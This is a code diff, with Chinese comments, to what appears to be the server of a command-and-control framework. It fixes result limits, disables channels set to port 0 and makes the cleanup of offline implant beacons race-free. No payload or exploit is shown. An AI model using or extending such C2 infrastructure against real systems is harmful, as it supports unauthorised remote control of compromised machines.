@@ -112,7 +112,10 @@ class PyExec2Server:
         if config.client_tls:
             self._client_ssl_ctx = self._make_client_tls_ctx(config)
 
-        self._mgr = ClientManager()
+        # B15: 每 beacon 结果保留条数显式传配置(reload 热更新前的默认 200
+        # 与 config 不一致——此前漏传, 改配置不重启不生效)
+        self._mgr = ClientManager(
+            max_results_per_beacon=config.max_results_per_beacon)
         self._tq = TaskQueue(max_tasks_per_client=config.max_tasks_per_client)
         self._events = EventWriter(config.event_file)
 
@@ -186,11 +189,15 @@ class PyExec2Server:
     # ── 内部 ──
 
     def _start_listener(self) -> None:
-        # 端口标识即协议角色（beacon/client，10.1 绑定校验用）
-        ports = {
-            "beacon": (self._config.server_port, self._key_implant),
-            "client": (self._config.client_port, self._key_client),
-        }
+        # 端口标识即协议角色（beacon/client，10.1 绑定校验用）。
+        # 端口 0 = 该通道关闭(web 通道配置「填 0 关闭」语义,2026-09-04):
+        # 不 bind、不监听——此前 bind(0) 会让 OS 分配随机端口,界面显示 0,
+        # 已部署 implant 全部失联
+        ports = {}
+        if self._config.server_port > 0:
+            ports["beacon"] = (self._config.server_port, self._key_implant)
+        if self._config.client_port > 0:
+            ports["client"] = (self._config.client_port, self._key_client)
         self._listener = Listener(
             host=self._config.server_host,
             ports=ports,
@@ -205,6 +212,8 @@ class PyExec2Server:
         长任务期间 beacon 端每 30s 发心跳包（<bid>\\x01），收到即刷新
         last_seen，show 不再误判离线。
         """
+        if self._config.server_port <= 0:
+            return  # beacon 通道关闭(端口 0),无心跳可收
         if self._udp_sock:
             return
         try:
@@ -306,14 +315,23 @@ class PyExec2Server:
         def cleanup() -> None:
             while self._running:
                 time.sleep(60)
-                offline = self._mgr.get_offline_clients(
-                    timeout=self._config.beacon_expire_seconds)
+                expire = self._config.beacon_expire_seconds
+                offline = self._mgr.get_offline_clients(timeout=expire)
                 for c in offline:
-                    if c.active:
-                        continue  # 活跃会话（正在执行任务）不清理
+                    # B15: 删除判定与执行在 mgr 锁内原子完成(remove_if_offline
+                    # 重校验 last_seen/活跃会话计数)——旧流程快照后再删,
+                    # 两步之间 beacon 刚重连会被误清(TOCTOU)
+                    if not self._mgr.remove_if_offline(c.client_id, expire):
+                        continue
                     # M8：连任务队列一起清（此前队列残留，bid 复用会重放）
                     self._tq.clear(c.client_id)
-                    self._mgr.remove_client(c.client_id)
+                    # B15: 清理该 beacon 的在途登记(否则条目永久泄漏)
+                    inflight = getattr(self._mgr, "_inflight", None)
+                    if inflight is not None:
+                        try:
+                            inflight.remove_client(c.client_id)
+                        except Exception:
+                            pass
                     self._events.emit(EVT_DISCONNECT, c.client_id,
                                       reason="timeout")
                     logger.info("beacon %s removed (timeout)", c.client_id[:8])
